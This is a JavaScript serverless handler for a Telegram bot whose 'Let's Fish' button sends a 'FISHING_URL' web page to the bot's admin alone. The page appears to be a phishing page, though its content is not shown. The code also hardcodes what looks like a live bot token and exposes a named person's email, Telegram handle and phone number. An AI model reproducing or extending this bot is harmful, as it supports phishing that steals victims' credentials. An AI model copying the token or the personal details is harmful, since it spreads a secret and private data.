export default async function handler(req, res) {
  const BOT_TOKEN = "7740401254:AAGqaGtAQ2YEiwXtjert2CiuWFADXbGz3Jg";
  const ADMIN_ID = "7216371031";
  const TELEGRAM_LINK = "https://t.me/mohdrishad";
  const FISHING_URL = "https://heavenscake.vercel.app/page.html";
  const INSTAGRAM_URL = "https://instagram.com/r1shaad__";

  if (req.method === "POST") {
    const body = req.body;

    if (body.message && body.message.text === "/start") {
      const chatId = body.message.chat.id;

      const reply_markup = {
        inline_keyboard: [
          [
            { text: "🔗 My Instagram", url: INSTAGRAM_URL },
            { text: "👤 About Admin", callback_data: "admin_info" }
          ],
          [
            { text: "🎣 Let’s Fish", callback_data: "fish_request" }
          ]
        ]
      };

      await sendMessage(BOT_TOKEN, chatId, "👋 Welcome to Tecky Rishad Bot!\n\nChoose an option below:", reply_markup);
    }

    if (body.callback_query) {
      const userId = body.callback_query.from.id.toString();
      const queryId = body.callback_query.id;
      const data = body.callback_query.data;

      let message = "";

      if (data === "admin_info") {
        if (userId === ADMIN_ID) {
          message = `👤 Admin Details:\n` +
            `Name: Muhammed Rishad AJ\n` +
            `Phone: 91857088697\n` +
            `Email: muhammedrishadaj@yahoo.com\n` +
            `Telegram: @mohdrishad`;
        } else {
          message = `👤 Admin Details:\n` +
            `Name: Muhammed Rishad AJ\n` +
            `Phone: xxxxxxxxxx\n` +
            `Email: muhammedrishadaj@yahoo.com\n` +
            `Telegram: @mohdrishad`;
        }
      }

      if (data === "fish_request") {
        if (userId === ADMIN_ID) {
          message = `🎣 Click here to fish:\n${FISHING_URL}`;
        } else {
          message = `🚫 This is not for you!\n\nAsk admin for permission:\n👉 ${TELEGRAM_LINK}`;
        }
      }

      await sendMessage(BOT_TOKEN, userId, message);
      await answerCallback(BOT_TOKEN, queryId);
    }

    return res.status(200).end("ok");
  } else {
    return res.status(405).end("Method Not Allowed");
  }
}

// Telegram sendMessage
async function sendMessage(token, chatId, text, reply_markup = null) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      reply_markup
    })
  });
}

// Telegram answerCallback
async function answerCallback(token, queryId) {
  await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ callback_query_id: queryId })
  });
}
